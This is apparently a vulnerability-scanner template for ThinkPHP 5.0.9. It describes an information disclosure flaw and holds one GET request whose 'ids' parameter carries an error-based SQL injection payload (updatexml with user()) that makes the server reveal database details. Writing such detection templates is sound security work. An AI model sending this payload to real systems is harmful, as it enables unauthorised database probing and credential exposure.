id: thinkphp-509-information-disclosure
info:
  name: ThinkPHP 5.0.9 - Information Disclosure
  author: dr_set
  severity: critical
  description: The vulnerability of thinkphp-509-information-disclosure allows for
    sensitive database credentials to be revealed through a verbose SQL error message
    in ThinkPHP 5.0.9.
  reference:
  - https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/in-sqlinjection
  tags: thinkphp,vulhub
  metadata:
    impact: The impact of the ThinkPHP 5.0.9 information disclosure vulnerability
      is that it can lead to unauthorized access to sensitive information and compromise
      the security of the affected systems.
    recommendation: It is recommended to upgrade to a newer version of ThinkPHP to
      avoid the potential exposure of sensitive information through verbose SQL error
      messages.
requests:
- method: GET
  path:
  - '{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
  matchers-condition: and
  matchers:
  - type: word
    words:
    - SQLSTATE
    - XPATH syntax error
    condition: and
  - type: status
    status:
    - 500
